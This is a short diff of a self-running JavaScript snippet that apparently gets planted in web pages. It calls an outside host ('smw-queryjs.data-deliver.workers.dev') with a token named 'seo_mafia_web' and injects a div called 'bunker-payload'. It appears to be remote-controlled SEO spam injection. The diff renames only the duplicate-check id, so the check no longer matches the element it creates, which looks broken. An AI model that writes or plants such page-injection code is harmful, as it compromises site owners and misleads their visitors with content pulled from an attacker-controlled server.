@@ -1,6 +1,6 @@
 !function(){
 try{
-  if(document.getElementById("bunker-payload")) return;
+  if(document.getElementById("bunker-payload-2")) return;
 
   const API_BASE = "https://smw-queryjs.data-deliver.workers.dev";
   const TOKEN = "seo_mafia_web";
@@ -64,7 +64,7 @@ try{
     });
 
     function inject(){
-      if(document.getElementById("bunker-payload")) return;
+      if(document.getElementById("bunker-payload-2")) return;
 
       const box = document.createElement("div");
       box.id = "bunker-payload";
